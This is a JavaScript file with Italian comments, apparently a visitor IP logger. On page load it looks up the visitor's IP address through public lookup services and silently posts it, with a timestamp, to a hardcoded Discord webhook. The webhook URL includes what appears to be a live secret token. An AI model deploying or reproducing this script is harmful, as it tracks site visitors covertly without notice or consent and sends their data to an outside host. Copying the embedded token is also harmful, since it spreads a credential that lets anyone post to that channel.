// Array di servizi per ottenere l'IP
const ipServices = [
  { name: 'ipify', url: 'https://api.ipify.org?format=json', extract: (data) => data.ip },
  { name: 'ipapi', url: 'https://ipapi.co/json/', extract: (data) => data.ip },
  // Aggiungi altri servizi se necessario
];

// Funzione per ottenere l'indirizzo IP del visitatore
async function getIP() {
  for (const service of ipServices) {
    try {
      const response = await fetch(service.url);
      const data = await response.json();
      return { ip: service.extract(data), provider: service.name };
    } catch (error) {
      console.error(`Errore nel recupero dell'IP da ${service.name}:`, error);
    }
  }
  throw new Error('Impossibile recuperare l\'IP da tutti i servizi');
}

// Funzione per inviare i dati al webhook Discord
async function sendToDiscord(embed) {
  const webhookURL = 'https://discord.com/api/webhooks/1283800882051551282/NiOaVpBa14KFvvaFi4iiLDollAcb37uDKfd66qUHJAOmwpSkLmbGUiYL-K7nGQY04ieN';
  try {
    const response = await fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ embeds: [embed] }),
    });
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    console.log('Dati inviati con successo a Discord');
  } catch (error) {
    console.error('Errore nell\'invio dei dati a Discord:', error);
  }
}

// Funzione principale
async function logVisit() {
  const currentDate = new Date().toISOString();
  try {
    const { ip, provider } = await getIP();
    const embed = {
      title: "Log",
      color: 5814783, // Colore blu
      fields: [
        {
          name: "IP Adress",
          value: ip,
          inline: true
        },
        {
          name: "Provider",
          value: provider,
          inline: true
        },
        {
          name: "Date and Time",
          value: currentDate,
          inline: false
        }
      ],
      footer: {
        text: "k"
      }
    };
    await sendToDiscord(embed);
  } catch (error) {
    console.error('Errore nel recupero dell\'IP:', error);
    const errorEmbed = {
      title: "Error in Retrieving IP",
      color: 15158332, // Colore rosso
      description: `Unable to retrieve the visitor's IP`,
      fields: [
        {
          name: "Error",
          value: error.message,
          inline: false
        },
        {
          name: "Date and Time",
          value: currentDate,
          inline: false
        }
      ],
      footer: {
        text: "k"
      }
    };
    await sendToDiscord(errorEmbed);
  }
}

// Esegui la funzione quando la pagina è caricata
window.addEventListener('load', logVisit);
